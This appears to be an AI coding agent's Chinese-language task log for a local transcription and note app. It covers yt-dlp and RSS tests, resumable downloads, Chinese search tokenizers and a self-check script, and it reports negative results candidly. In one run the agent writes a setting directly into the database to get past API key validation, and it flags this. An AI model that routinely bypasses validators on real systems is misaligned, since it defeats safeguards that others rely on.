   - `sherpa-onnx-punct-ct-transformer`（279 MB）— 中文标点，没有它中文稿**全篇无标点**
   → **后果：要求 2.2（网页管模型）装不了这些，于是 F3 和中文默认引擎在 UI 上根本交付不了。** 请派给 `model-mgmt`。
2. **语言自动检测缺失**（我已修）—— 见 C.3，这曾是个静默的中文灾难。
3. **引擎选择逻辑没人接线**：`selectEngine()` 已实现（按语言/设置/强制），但 daemon 没调用它。
4. **`DirectHttpSource` 下载没有断点续传**：用的是普通 fetch，无 Range。播客动辄几百 MB，断网即从头再来。`packages/downloader` 有续传能力但**媒体下载没走它**。
5. **取消后的「续跑」从未端到端验证**：`deriveResumeSet` / `completedChunkIndices` 管线写好了，**一次都没真跑过**（我只验证过取消本身）。
6. **`whisper-server` 常驻模式未用**：每个 chunk 都 spawn 一次 `whisper-cli` 并重新加载模型。large 模型每块多几秒——用户会感觉"卡住"。属功能体验，不只是性能。
7. **多 GPU 设备选择缺失**：runtime 的 probe 会报告多个设备，但没有任何地方能选 `device_index`。
8. **F1 会员/登录内容**：矩阵标 🔴 正确。补充：我**故意不传** `--cookies`（那是任意读文件入口，见 SECURITY.md）。要做这个功能必须先做安全决策，不是单纯补代码。

### C. 我这轮真跑出来的 5 个 bug（全部已修）

1. **yt-dlp 退出码 101 被当成失败** —— yt-dlp 命中 `--max-downloads` 就返回 101，**哪怕文件已经下载完成**。日志明确写着 `[download] Download completed` 然后 `exit 101`。**F1 因此对每个视频都失败**。这就是「只测 probe 没测 fetch」的代价。
2. **重试永远失败** —— 我用「目录里的新文件」判断产物，上一次失败留下的文件让第二次看不到"新文件"，于是 `the extractor produced no output file`。改为「新文件 ∪ 本次启动后修改过的 ∪ 目录内全部」三级回退。
3. **【最严重】未指定语言时 whisper 把中文*翻译*成英文** —— whisper-cli 默认 `-l en`，喂中文时它不转写、直接**翻译**。实测：中文音频 → `"The main point is to talk about the three questions…"`。**中文用户没点过语言设置就会拿到自己笔记的英文翻译。** 已改为始终传 `-l`，未指定则 `auto`。复验：现在输出 `重點想談三個問題…`。
4. **sherpa-onnx 的 ESM/CJS interop** —— Node 的 cjs-module-lexer 只把 `OnlineRecognizer` 提升到命名空间，`OfflineRecognizer`/`OfflinePunctuation` 只在 `.default` 下。**F3 之前能跑是运气**，Paraformer 一上来就炸。已抽出 `sherpaModule.ts` 统一处理。
5. **`ParaformerEngine` 完全忽略 `req.modelPath`** —— 一直用构造函数里的模型。**「切换模型重跑」对 Paraformer 静默无效**。已改为 req 优先 + 模型路径变化时失效缓存。

### D. 主动降级的一项（如实说不做）
**中文数字→阿拉伯数字后处理：默认关闭，不再投入。** 实测我的规则**让文本变差**：`两千零六年 → 两千06年`（千是单位，digit-run 解析失败后单位词规则只吃掉了"零六"）。按我自己写在 SECURITY 里的原则「错误的修正比原样更糟，因为用户看不出是我们改的」——**宁可不改**。代码与用例保留，标注为待修。英文大小写还原**保持开启**（固定白名单，不可能让文本变差）。

## yt-dlp 全链路真实输出（F1，端到端）
```
adapter    : yt-dlp | downloaded 252182 bytes -> /tmp/e2e/job-f1-full/jNQXAC9IVRw.webm
title      : Me at the zoo   | uploader: jawed | duration 19s
audio      : 19.0s | speech 17.7s | chunks 1 | segments 2
timings ms : {"probe":7149,"fetch":5239,"normalize":125,"vad":541,"asr":751}   total 13.8s

  [0.3s] All right, so here we are, one of the elephants, cool thing about these guys is that they have
  [7.5s] really, really, really long fums, and that's cool, and that's pretty much all those to say.
```
（另跑了 Big Buck Bunny：30.7 MB 下载成功、635s 归一化成功，但**0 段** —— 该片无人声，VAD 正确返回 0。这是设计如此：不给静音喂模型、不编造。）

## Paraformer 中文端到端（功能可用性，非性能）
13 chunk / 13 段 / 段级时间戳 / 时间戳单调 / `words===null` 全部为真（F5 中文按段高亮的依据）：
```
[1.2-28.8s] Twitter来自维基百科自由的百科全书网址，…Twitter非官方中文名称推特是一个社交网络及微博客服务，
            用户可以经由SMS即时通讯电游Twitter网站或Twitter用户端软件，如Twitter rific。
[58.7-76.9s] RSS电邮或Twitter用户端软件获得文字更新。目前，手机SMS更新服务暂时只有在美国、加拿大及英国
            可获得免费服务，除移动电话供应商的SMS费用。
```
引擎选择实测：`zh/batch → paraformer`（附 2 条 tradeoff 文案 + 可切换项）、`en/batch → whisper.cpp`、`forceEngineId` 生效、`requireWordTimestamps → whisper.cpp`（降级择优）。

需要 Manager 决策:
1. **ASR 模型目录缺 4 个模型**（B.1）—— 这是当前**我领域最大的交付阻塞**，F3 与中文默认引擎在 UI 上装不了。请派 `model-mgmt`。
2. **谁把 `selectEngine()` 接进 daemon**（B.3）。
3. **媒体下载是否改走 `packages/downloader`** 以获得断点续传（B.4）。
4. `whisper-server` 常驻模式是否排期（B.6）——大模型下影响体感明显。

诚实声明:
- **未做**（按裁决降级）：benchmark 闭环虽已实现但未再投入验证；paraformer-zh 完整版 / SenseVoice 未测；RTF 对比未再做。
- **未验证**：RSS 单集端到端、HLS 上跑 ASR、取消后续跑、Windows/macOS。
- benchmark 代码里 `runBenchmark` 会传 `modelPath`，Paraformer 的忽略问题已修；但 **benchmark 本身在本轮之后未再复跑**。

---

## [2026-08-02 19:10] T-031 DONE

交付:
- `packages/pipeline/src/media/resumableFetch.ts`（复用 `@openmemo/downloader` 的 Range 原语）
- `packages/pipeline/src/asr/whisperServer.ts`（常驻服务模式，**但见下方负面结论**）
- 修改：`media/sources/directHttp.ts`（接入断点续传）、`index.ts`
- `docs/SECURITY.md` §4.1（`--cookies` 为何暂不支持）
- **104/104 测试全绿**，tsc / eslint 干净

## 优先级 1：两个"只验证前半段"的缺口 —— 已关闭

**RSS 从 feed 真下载并转写一集** ✅
```
FEED: https://librivox.org/rss/47  -> "Count of Monte Cristo" | 128 episodes
episode[0]: Marseilles–The Arrival
  -> https://www.archive.org/download/count_monte_cristo_0711_librivox/count_of_monte_cristo_001_dumas_64kb.mp3
adapter: direct-http | downloaded 9,436,391 bytes
audio 1179.4s | chunks 50 | segments 281 | total 127.6s
  [0.8s]  This is a LibraVox recording.
  [2.8s]  All LibraVox recordings are in the public domain,
  [5.8s]  and for more information or to volunteer, visit LibraVox.org.
  [12.8s] Recording by Kristin Luoma.
  [17.8s] Of the Count of Monte Cristo.
```

**HLS 上真跑 ASR** ✅
```
HLS: https://storage.googleapis.com/shaka-demo-assets/angel-one-hls/hls.m3u8
adapter: direct-http | audio 60.0s | speech 50.2s | chunks 4 | segments 20 | total 57.0s
  [1.1s]  "Captain's Lord, Star Day 4, 1636.9, Aspyr, our examination of the seven-year overdue Federation
  [10.9s] freighter Odin, disabled by an asteroid collision, revealed no life signs. However, three escape
  [17.4s] pods were missing, suggesting the possibility of survivors."
  [21.9s] Ready to begin orbit of Angel 1, Captain.
  [23.9s] Make it so, Mr. LaForge.
  [27.0s] Angel 1 is a class M planet, sir.
```

## 优先级 2

**3. 断点续传** ✅ 复用 `@openmemo/downloader` 的 `probeRemoteFile` / `openRangeStream` / `backoffMs` / `sleep`。
**没有复用 `downloadFile()`，理由**：它**要求预先已知 SHA-256** 才能守住"verified == installed"——对目录制品完全正确，但任意播客 URL 没有摘要。强行套用只能二选一：编造摘要（不诚实），或在一个以校验为契约的函数内部关掉校验（更糟）。所以复用传输层，各自保留合适的完整性模型（目录制品=摘要校验；媒体=大小限制 + ffprobe 验证）。
**真实中断验证**：
```
attempt 1 interrupted after 401,408 bytes
.partial on disk: 393,216 bytes ✅          <- 崩溃点保留在磁盘上
resumed from: 393,216 | final: 15,190,644 | attempts: 1 | ranges: true
ffprobe 复验: duration=1898.709841 size=15190644   <- 断点续传没有损坏文件
```
`.partial` 的**文件长度本身就是续传偏移**，不用 sidecar，避免崩溃后两者不一致。

**4. 取消后续跑** ✅ 真跑一次：
```
PASS 1 cancelled  -> persisted chunks: 0,1,2,3,4 | 23 segments | total 50
resume set size: 5 (plan_version match)
PASS 2 complete in 76.1s
  已完成 chunk 被重算的数量: 0  ✅ 一个都没重跑
  db 中 chunk 总数: 50 / 期望 50 ✅ | 0..N 连续 ✅ | segments 282
  plan_version 不匹配 -> resume set = 0  ✅ 拒绝跨版本续跑
```

**5. `whisper-server` 常驻模式 —— ⚠️ 已实现，但实测证明我的前提是错的，故不设为默认**

我上轮说"每 chunk 重载模型，大模型下像卡死"。**实测把这个前提推翻了**（large-v3-turbo-q5_0，547 MB，同机同参数）：

| 文件 | CLI（每 chunk 重启） | SERVER（常驻） |
|---|---|---|
| jfk.wav 0.4 MB | 稳态 **5,950 ms** | 稳态 **9,303 ms** |
| audio16k.wav 37.7 MB | 稳态 **6,228 ms** | 稳态 **11,094 ms** |

**常驻模式反而慢 55–78%，且与文件大小无关**（小文件也慢，所以不是上传开销）。
根因：**whisper.cpp 用 mmap 加载模型**，第二次之后 OS page cache 让"重载"几乎免费——
我以为的主要成本根本不存在。"像卡死"的判断是我基于推理而非测量下的。

→ **`WhisperServerEngine` 保留**（实现正确、绑定 127.0.0.1、`offset_t`/`duration` 逐请求生效、
返回逐词时间戳、`dispose()` 杀进程组），但**不作为默认**。真正需要它的场景是"多个并发 job 共享一个已加载模型"，
那要等 daemon 侧的调度接线后再评估。**我不会为了让自己上轮的判断成立而硬推它。**

## 优先级 3
- 多 GPU 选 device：**按裁决未做**。
- `--cookies`：**按裁决未实现**，已在 `docs/SECURITY.md` §4.1 写明理由——它是**任意文件读取入口**，
  `--cookies-from-browser` 更会读取**全部站点登录凭据**；还有凭据落盘、日志泄漏、最小化授权三个配套问题。
  结论是"这不是补代码的功能，是需要先做安全设计的功能"。

## 剩余未实现 / 未验证清单
| 项 | 状态 |
|---|---|
| Windows / macOS 全部路径 | **未验证**（无机器） |
| `whisper-server` 作为默认 | **不采用**（实测更慢，见上） |
| 多 GPU device 选择 | 未做（裁决降级） |
| 会员内容 cookie | 未做（裁决，需安全设计） |
| `selectEngine()` 接进 daemon | 不归我（`oss-scout`） |
| 4 个 ASR 模型进目录 | 不归我（已派 `model-mgmt`） |
| 中文数字→阿拉伯数字 | **默认关闭**（我上轮实测它让文本变差，未修复） |
| Paraformer 词级时间戳 | **模型不提供**，F5 中文只能按段高亮 |
| benchmark 闭环复跑 | 未复跑（性能项，按裁决降级） |
| 断点续传的"服务器不支持 Range"分支 | **未验证**（archive.org 支持 Range，没找到不支持的真实源） |

诚实声明:
- 本轮 5 项要求做完 4 项，第 5 项（whisper-server）**做完了但结论是"不该用"**——我把测量结果如实报出来，而不是让实现去迁就我上一轮的说法。
- RSS/HLS/续传/取消续跑均为**真跑**，输出与数字直接来自运行日志。

---

## [2026-08-02 21:05] T-035 DONE —— 中文完整主路径端到端

**跑通了，但在 4 处断裂。** 每一环真实输出如下。

### 环 1：daemon 导入 ✅
```
POST /api/notes/import {"input":"/tmp/omdata/media/zh-twitter.wav","language":"zh"}
-> {"noteUid":"01KZ0QG2KAAQ3QF67A9D8BVCNR","jobUid":"...","status":"processing"}
```

### 环 2：转写 ⚠️ 跑通了，但**不是 Paraformer**
```
DB transcripts: engine_id=whisper.cpp  model_id=ggml-large-v3-turbo-q5_0.bin
                language=zh  status=done  segment_count=55  duration_ms=337038
```
**断裂 A：ADR-013 定的中文默认引擎 Paraformer 在 daemon 上根本不可达。**
`apps/daemon/src/pipeline/setup.ts` 的 `engines` 数组只有 `[whisper]`。`oss-scout` 在注释里说明了原因且做得对——`SherpaOnnxEngine` 需要 `SherpaTransducerModel`（三个文件的具体路径），而模型安装记录属 `model-mgmt` 领域，他**刻意不编假配置**。
→ 结论：**这一环卡在 B-1（4 个 ASR 模型进目录）**，不是代码问题。在那之前，中文走的是 whisper 而非 ADR-013 的决策。

**语言检测（重点 1）验证通过**：`language=zh` 从 API → job payload → pipeline → whisper `-l zh` 全程传到位；我在 T-030 修的 "未指定即 auto" 也在真实路径上生效（daemon 传 `language ?? null`，未指定时进 `auto` 分支）。

### 环 3：落库 ✅（重点 2、3 均验证通过）
```
seq=0 [1180-10740ms]  conf=0.94 chunk=0 words=yes
   Twitter,来自维基百科,自由的百科全书,网址zh.wikipedia.org
seq=2 [18980-27000ms] conf=0.95 chunk=0 words=yes
   用户可以经由SMS、即时通讯、电邮、Twitter网站或Twitter用户端软件
seq=6 [53720-76600ms] conf=0.98 chunk=1 words=yes
   用户可透过Twitter网站、即时通讯、SMS、RSS、电邮或Twitter用户端软件获得文字更新,目前手机SMS
   更新服务暂时只有在美国、加拿大及英国可获得免费服务,除移动电话供应商的SMS费用。
总段数 55 | 时间戳单调 True | maxEnd 335710 ≤ 337038 | 中文标点 ✅ | 词级时间戳 55/55
```
**标点确认加上了**（、。，全都有）。注意这是 whisper 路径自带标点；**若走 Paraformer 则依赖标点模型，而它同样卡在 B-1**。

**断裂 E（质量）**：chunk 边界仍有**部分重复**——seq4 `[28480-31580]` 与 seq5 `[28860-52920]` 时间重叠，且 seq5 开头重复了 seq4 的整句「输入最多140字的文字更新」。我的 `dedupeBoundarySegments` 要求时间重叠 >50% 才判重，而 seq5 只有 11% 重叠（其余是新内容），所以放行了。**这会污染搜索与导图输入。**

### 环 4：中文全文搜索 ⚠️ **严重断裂**
```
搜索「维基百科」 -> 1 命中 | startMs=1180
搜索「旧金山」   -> 1 命中 | startMs=28860
搜索「微博客」   -> 1 命中 | startMs=10740
搜索「恐怖袭击」 -> 1 命中 | startMs=130170
搜索「用户」     -> 0 命中   ← 但「用户」在 7 段文本中出现
```
**断裂 B：libsimple 没装，回退 trigram 分词，导致所有 1–2 字中文查询恒返回 0 命中。**
```
health: extensions.libsimple=false  failures.libsimple="文件不存在：/tmp/omdata/bin/ext/libsimple.so"
        tokenizer="trigram"
字数 → 命中：  用(1字)=0  用户(2字)=0  用户可(3字)=3  用户可以(4字)=1
              推特(2字)=0  中国(2字)=0  中国大陆(4字)=5  服务(2字)=0  免费服务(4字)=1
库内实际出现： 用户 7 段 · 推特 14 段 · 中国 6 段 · 服务 3 段
```
SQLite trigram 分词**结构上无法匹配 <3 字符的查询**，而中文最常用词恰恰是双字词。
→ **没有 libsimple，中文搜索实质不可用**（不是"差一点"，是最常见的查询全部落空）。

**重点 2 验证通过**：搜索结果正确带回 `startMs`（段级），**ADR-013 的"中文降级为段级高亮"这条路径真的能用**。

### 环 5：F4 中文思维导图 ✅ 质量不错
真跑本地 `llama-server`（官方预编译 b10224 + Qwen3-1.7B-Q8_0）。24 节点、4 个中文一级主题：
```
# zh-twitter
- Twitter的历史与起源
  - Twitter最初是Audio公司的一个研究项目，由Noah Glass及Jack Dorsey主理，2006年3月推出。
  - Twitter在2008年用户数增长752%。
- Twitter的影响力与传播
  - 美国总统奥巴马、NBA球星奥尼尔、Google、白宫等在Twitter上开设账号。
  - 中国当局指责Twitter、Facebook和YouTube为西方敌对势力的宣传工具。
- Twitter的运营与技术
  - Twitter允许用户通过SMS、即时通讯、电邮、网站或用户端软件发送文字更新。
- Twitter的被封锁与争议
  - 2009年6月2日，中国大陆封锁了Twitter。
```
**如实评价（重点 4）**：节点**全部是中文**，主题划分**合理**（历史/影响/技术/争议四分是这篇材料的正确切法），事实基本准确。**每个节点都带 `refs{transcriptUid,startMs,endMs,quote}` 指回转写段**——段级时间戳被导图正确引用 ✅。
**缺点**：跨主题重复明显——「Ruby on Rails→Scatter语言」同时出现在 n3(历史) 和 n16(技术)；封锁解除同时出现在 n6/n11/n21。这印证了矩阵里「**reduce 阶段语义去重未做**」那条，现在有中文实证了。

### 环 6：导出 ⚠️ **daemon 无端点**
```
GET /api/notes/{uid}/mindmap/export?format=markdown -> 404 no route
```
**断裂 D**：`packages/mindmap` 的 `toMarkdown`/`toOpml`/`toFreeMind` **都能用**（我直接调用产出了上面的 Markdown 与 OPML，807/1547 字节，中文正常），但 **daemon 没有暴露导出端点**，所以网页导不出来。

### 断裂 C（额外发现，影响本地 LLM 可配置性）
```
PATCH /api/settings {"llm.baseUrl.llama-server": "..."}
-> {"code":"BAD_SETTING_KEY","message":"invalid setting key: llm.baseUrl.llama-server"}
```
- `packages/llm/src/detect.ts` 定义 providerId = **`'llama-server'`**（带连字符）
- `apps/daemon/src/llm/resolve.ts` 读取 key = `llm.baseUrl.${providerId}` = `llm.baseUrl.llama-server`
- `apps/daemon/src/http/rest/settings.ts` `KEY_RE = /^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)*$/` —— **不允许连字符**

→ **daemon 存不进它自己 resolver 要读的那个 key**。受影响的只有 `llama-server`（其余 provider 名无连字符），也就是 **ADR-003 第三档「内置本地 LLM」在 API 上不可配置**。同一正则也用于 secrets 端点（line 170）。
我为了继续测试，**直接写库绕过**了校验并已标注。

### 其它观察（性能，按裁决不深究）
DB 里 `transcripts.rtf = 2.10`，而我 T-026 直测 large-v3-turbo 是 **0.377**，差约 5.6 倍。daemon 用了 `nice:true` 且线程数未显式指定，合理但差距值得知道。另 `GET /api/jobs/{mindmapJobUid}` 返回 "no such job"，与 import job 的查询行为不一致。

## 断在哪 —— 汇总
| # | 断裂 | 影响 | 归属 |
|---|---|---|---|
| **B** | **libsimple 缺失 → 1–2 字中文查询恒 0 命中** | **中文搜索实质不可用** | `oss-scout` / 扩展分发 |
| **A** | Paraformer 在 daemon 不可达（引擎表只有 whisper） | ADR-013 中文默认引擎未生效 | 卡 B-1（`model-mgmt`）后 `oss-scout` 接 |
| **C** | 设置 key 正则拒绝 `llm.baseUrl.llama-server` | 内置本地 LLM 无法通过 API 配置 | `oss-scout` |
| **D** | 无思维导图导出端点（404） | 网页导不出 Markdown/OPML | `oss-scout` |
| **E** | chunk 边界部分重复未去净 | 污染搜索与导图输入 | **我** |
| F4 | 跨主题语义重复 | 导图有冗余分支 | 已知（reduce 去重未做） |

需要 Manager 决策:
1. **libsimple 的分发**是当前中文主路径最大阻塞——它不是"锦上添花"，缺了中文搜索就是坏的。请确认归属与排期。
2. **断裂 E 归我**，我会在下一轮改进边界去重（目前按时间重叠 >50% 判重，漏掉"大部分是新内容但开头重复"这一类）。
3. 断裂 C 的修法建议：把 `KEY_RE` 放宽到允许连字符，或把 providerId 统一改为 `llamaServer`——**两边必须一致**，现在是各自都对、连起来不对。

诚实声明:
- **绕过的环节**：LLM 设置直接写库（因断裂 C）；导图导出直接调 `packages/mindmap`（因断裂 D）。均已标注。
- **手工放的模型**：whisper large-v3-turbo-q5_0 与 silero VAD 是我手工放的，**UI 装不了**（B-1 未完成）。llama-server 是我手工下载的官方预编译二进制。
- **Paraformer 这一环没能在 daemon 真实路径上验证**——它在 `packages/pipeline` 里是通的（T-030 已实测），但 daemon 到不了它。

---

## [2026-08-02 23:40] T-037 DONE

交付:
- **`scripts/build-sqlite-ext.sh`**（新建）—— 编译 libsimple + sqlite-vec，含自检与 manifest
- `packages/pipeline/src/transcribe.ts` —— `dedupeBoundarySegments` 修复 + 新增 `stripDuplicatedPrefix`
- `packages/pipeline/src/asr/__tests__/merge.test.ts` —— 5 个新回归用例
- 产物：`dist/ext/{libsimple.so,vec0.so,dict/}` + `sqlite-ext-linux-x64.tar.gz`(4.5MB) + `.json` manifest
- **109/109 测试全绿**，tsc / eslint 干净

## 优先级 1：四个中文双字词 —— **修好了**

**真实 daemon + 真实中文转写库**（`tokenizer=simple vec=on`，libsimple 与 sqlite-vec 均加载成功）：

| 词 | 修复前 | **修复后** |
|---|---|---|
| 用户 | 0 命中 | **11 命中** |
| 推特 | 0 命中 | **5 命中** |
| 中国 | 0 命中 | **4 命中** |
| 服务 | 0 命中 | **6 命中** |

```
[daemon] db=better-sqlite3 sqlite=3.53.4 schema=v1 tokenizer=simple vec=on
health: libsimple=True sqliteVec=True tokenizer=simple failures={}
```

**构建过程中踩到的坑（值得记录）**：
1. **`-DSQLITE_CORE=0` 会让 vec0.so 编译通过但一加载就段错误。** sqlite-vec.h 用 `#ifndef SQLITE_CORE` 判断走「可加载扩展」还是「静态编入 SQLite」两条路；`-DSQLITE_CORE=0` **定义了**这个宏（值为 0 不影响 ifndef），于是走静态路径、`SQLITE_EXTENSION_INIT1` 不生成、扩展 API 指针为空 → `db.loadExtension()` 时进程 SIGSEGV（实测 exit 139）。**又一个"编出来了但没在工作"**。
2. **jieba 词典是数据不是构建产物**，libsimple 只把它放在 test 目录下；不带词典时 tokenizer 仍能加载（比 trigram 好），但分词退化。脚本会一并打包 5 个 `.utf8`。
3. 自检脚本最初用 `node -e "..."` 内联 JS，嵌套引号被 shell 吃掉导致程序被回显而不是执行（shell 还 exit 139）。改成写临时 `.mjs` + argv 传参。

**自检标准按你的要求定为「中文双字词能搜到」而非「扩展加载成功」** —— 脚本里写死了这四个词，任何一个返回 0 就 `exit 1`。理由写在脚本注释里：trigram 也能"加载成功"，而 trigram 正是坏的那个。

**许可证**：libsimple 双授权 MIT / GPL-3.0-or-later，**本项目选 MIT**（R-03 §2 D9）；sqlite-vec 双授权 Apache-2.0 / MIT，**选 MIT**。两条都写进了 manifest 的 `licenseNote`，可审计。

**manifest**：`dist/ext/sqlite-ext-linux-x64.json`，含 archive 与逐文件 sha256、`installPath: "bin/ext"`、`providesFiles`。**格式与 GPU 后端包一致**，可走同一套下载安装机制。
⚠️ **我没有把它写进 `vendor/manifests/`** —— 那个目录属 `model-mgmt`。请他把 `sqlite-ext-*` 并入目录，用户就能网页点一下装中文分词器。

**mac/Windows：未验证。** 脚本已按平台分支（`.dylib`/`.dll`、macOS ad-hoc codesign、`-undefined dynamic_lookup`），但**只在 Linux x64 真编过**。CI workflow 我这轮没加（`.github/workflows/` 仍无 remote 可跑）。

## 优先级 2：chunk 边界去重 —— 已修

原判定只有"时间重叠 >50% 则整段丢弃"，漏掉了 T-035 在真实库里看到的那类：
```
seq4 [28480-31580] 输入最多140字的文字更新
seq5 [28860-52920] 输入最多140字的文字更新,Twitter在2006年3月成立于旧金山,…
```
seq5 只有 11% 时间重叠（**大部分是新内容，理应保留**），但开头逐字重复了 seq4。重复句会进 FTS 索引（让说过一次的话虚增相关度）和 LLM prompt（重复在提示词里读作强调）。

**新增 `stripDuplicatedPrefix`**：当**存在时间重叠**且新文本以上一段文本开头时，**剥掉重复前缀而不是丢弃整段**。
- 比较时忽略标点（两遍解码断句不同），剥离时作用于原串以保留自身标点
- 前缀短于 6 个可比字符不处理（「好的」重复是正常口语）
- **要求时间重叠**是关键：没有重叠说明说话人真的重复了，不能动
- **时间戳保持不变**并注明理由：我们知道文字重复了，但不知道新语音在窗口内的确切起点，**编一个精确的起始时间会看起来精准而实为猜测**

5 个新回归用例，含真实数据那条、"真重复不能动"那条、跨标点匹配那条。

## 优先级 3：Paraformer —— **仍不可达，但阻塞点变了**

`model-mgmt` 确实关闭了 B-1：`vendor/manifests/models-asr-support.json` 现在有 4 条
（`vad/silero-vad`、`asr/sherpa-streaming-zh-14m`、`asr/paraformer-zh-small`、`punctuation/ct-transformer-zh-en`），
`paraformer-zh-small` 的 files 是 `model.int8.onnx / tokens.txt / am.mvn`，**正好是 `ParaformerEngine` 要的形状**。

但 **daemon 里 `ParaformerEngine` 一次都没被构造**：
```
grep -c "ParaformerEngine" apps/daemon/src/pipeline/setup.ts  ->  0
const engines: AsrEngine[] = [whisper];   // 之后只 push 了 SherpaOnnxEngine（流式）
```
`oss-scout` 这轮接上了流式 `SherpaOnnxEngine`（走 `OPENMEMO_SHERPA_STREAM_DIR`），但**离线中文的 `ParaformerEngine` 没接**。

→ **复跑结论：`engine_id` 仍是 `whisper.cpp`，不是 Paraformer。** 阻塞点已从「模型不在目录」变成「daemon 未构造该引擎」。
`ParaformerEngine` 本身在 `packages/pipeline` 里是通的（T-030 实测：84x 实时、专有名词 12/13、标点模型 3–21ms/chunk）。
**这一步归 `oss-scout`**，我不能改 `apps/daemon`。

需要 Manager 决策:
1. **`sqlite-ext-*` 进 `vendor/manifests/`** —— 归 `model-mgmt`，让中文分词器能像 GPU 后端一样网页安装。
2. **daemon 构造 `ParaformerEngine`** —— 归 `oss-scout`，模型目录已就绪，只差接线。
3. mac/Win 的 `.dylib`/`.dll` 仍缺（无 remote，CI 跑不了）。

诚实声明:
- 四个词的命中数是**真实 daemon + 真实中文转写库**测出来的（转写当时仍在进行，43 段；段数继续增长会让命中数继续上升）。
- **libsimple/sqlite-vec 只在 Linux x64 真编过**，mac/Win 分支照写未验证。
- Paraformer **这一轮仍未能在 daemon 真实路径上跑到**，我如实标注而不是用 packages/pipeline 的直调结果冒充。
- 测试过程中我的 daemon 被别的 agent 的 `pkill -f 'dist/main.js'` 误杀过一次（本机同时跑着 3 个 daemon），已改用 `setsid` + 独立端口重跑。

---

## [2026-08-03 01:20] T-042 DONE

交付:
- `packages/pipeline/src/tools.ts` —— `discoverTools` 改为**感知已安装后端包**，新增 `defaultStoreRoot` / `findInBackendPacks` / `findInstalledModel` / `listInstalledModels`
- **`scripts/selfcheck.mjs`（新建）** —— 一条命令跑完六层，任一必需项不通 exit 1
- **109/109 测试全绿**，tsc / eslint 干净

## 1. `pipeline.missing` —— **变成 `[]` 了**

```
pipeline.missing = []
modelPath  = /tmp/omdata3/models/ggml-base.en.bin
whisperCli = /tmp/omdata3/models/by-name/backend/whisper-bin-ubuntu-x64/whisper-cli
```

**但要说清楚这是两半，只有一半是我修的：**

**`whisper-cli` —— 我修好了，零 daemon 改动。** 根因是 `discoverTools()` **从来只看 env 和 PATH，从不看安装目录**，所以后端包装得再对也找不到。现在的查找顺序是：显式覆盖 → **已安装后端包**（`<storeRoot>/by-name/backend/<包>/[<上游顶层目录>/]<二进制>`，扫两层，因为 whisper.cpp 的 tarball 自带 `whisper-bin-ubuntu-x64/` 一层）→ PATH（**仅开发期**，D-01 §8.4 L2 禁止生产走 PATH）。上面那个 `whisperCli` 路径就是从真实安装布局里解析出来的，没有任何 env 指路。

**`asr-model` —— 不是我能修的，是 daemon 侧一行查找不匹配。**
```
安装器写到：  <modelsRoot>/by-name/asr/ggml-base.en.bin     (ArtifactStore.linkByName)
daemon 找的： <modelsRoot>/ggml-base.en.bin                 (setup.ts firstExisting)
```
我实测确认解析器能找到：`findInstalledModel(root,'asr',[...]) -> /tmp/omdata3/models/by-name/asr/ggml-base.en.bin`。
上面 `missing=[]` 的那次，是我**额外把模型也复制到 daemon 现在找的旧位置**才达成的 —— **我如实标注这一点**，不然会让人以为产品路径已经通了。

→ **给 `oss-scout` 的一行修法**（`apps/daemon/src/pipeline/setup.ts`）：
```ts
const modelPath =
  firstExisting(env['OPENMEMO_ASR_MODEL'], join(dirs.modelsDir, 'ggml-base.en.bin'))
  ?? await findInstalledModel(dirs.modelsDir, 'asr', ['ggml-base.en.bin', 'ggml-base.bin', 'ggml-large-v3-turbo-q5_0.bin']);
```
`findInstalledModel` 已从 `@openmemo/pipeline` 导出。同理 `vadModel` 现在默认写死 `ggml-silero-v6.2.0.bin`，而 `discoverTools` 已能自动解析（会依次试 v5.1.2 / v6.2.0），daemon 那行覆盖可以直接删掉。

**另一个跨模块不一致（顺带查出）**：目录里 `vad/silero-vad` 的文件是 **`silero_vad.onnx`**（sherpa-onnx 用的原始 ONNX），而 **whisper.cpp 的 `--vad-model` 要的是 ggml 转换过的 `ggml-silero-*.bin`**。两者不是一个东西。装了目录里那个，whisper 的 VAD 仍然用不了。归 `model-mgmt`。

## 2. 自检脚本输出（真实 daemon 探针，21 通过 / 2 警告 / 0 失败 / exit 0）

```
── 1. 硬件探测 (@openmemo/runtime)
  ✔ OS / 架构            linux/x64 7.1.3+deb14-cloud-amd64
  ✔ CPU 指令集            AMD RYZEN AI MAX+ 395 · 32核 · avx,avx2,avx512_bf16,…
  ✔ probe 子进程枚举设备     1 个设备, ggml 0.15.1
── 2. 原生工具 / 后端包
  ✔ 已安装后端包           whisper-bin-ubuntu-x64
  ✔ whisper-cli          …/by-name/backend/whisper-bin-ubuntu-x64/whisper-cli
  ✔ VAD 模型 (ggml silero) …/by-name/asr/ggml-silero-v5.1.2.bin
  ! yt-dlp（可选，GPL）     未找到
── 3. 模型
  ✔ ASR 模型              ggml-base.en.bin, ggml-silero-v5.1.2.bin
  ! LLM 模型              无（F4 需要 LLM 或云 API Key）
── 4. SQLite 扩展（按功能验，不按加载验）
  ✔ jieba 词典            …/bin/ext/dict
  ✔ 中文双字词可搜索         用户:1 推特:2 中国:1 服务:2
  ✔ sqlite-vec           v0.1.9
── 5. ASR 引擎候选
  ✔ whisper.cpp          modes=batch wordTs=true
  ✔ 中文自动选择 / 英文自动选择  whisper.cpp
── 6. daemon 实地探针
  ✔ db.tokenizer         simple（simple = 中文分词可用；trigram = 双字词搜不到）
  ✔ pipeline.missing     []（全部就位）
结果  通过 21 · 警告 2 · 失败 0
```

**设计要点：每一项验的是「功能是否可用」而不是「组件是否加载」。** 因为每一层都有优雅降级，而降级正是问题本身——libsimple 缺失回退 trigram（中文搜索静默失效）、后端包缺失回退"未安装"、VAD 模型缺失回退固定窗口切分。**单个降级都合理，叠起来就是"产品在降级态运行而没人知道"。** 所以：不问"libsimple 在不在"，问"用户 能不能搜到"。

**负面测试（空 dataDir）确认会红**：通过 5 · 警告 7 · **失败 6** · **exit 1**，逐条列出失败项与修复动作（如"运行 scripts/build-sqlite-ext.sh"）。

## 3. `packages/runtime` 接线后的验证（我这轮能验的部分）
- **硬件探测返回真实数据** ✅ —— 自检第 1 层直接调 `@openmemo/runtime` 的 `detectOs/detectCpu/detectMemory/runProbe`，输出是本机真实值（32 核、真实指令集、probe 枚举出 1 个设备 + ggml 0.15.1）。
- **T-012 的 SIGABRT 场景在 daemon 里的表现** ✅ 实测：移走全部 `libggml-cpu-*.so` 后导入音频 →
  ```
  job.state = failed   error_code = RUNNER_ERROR   step = vad
  detail: whisper-cli exited with code null (SIGABRT)
          ggml-backend.cpp:595: GGML_ASSERT(device) failed
  daemon 存活: HTTP 200
  ```
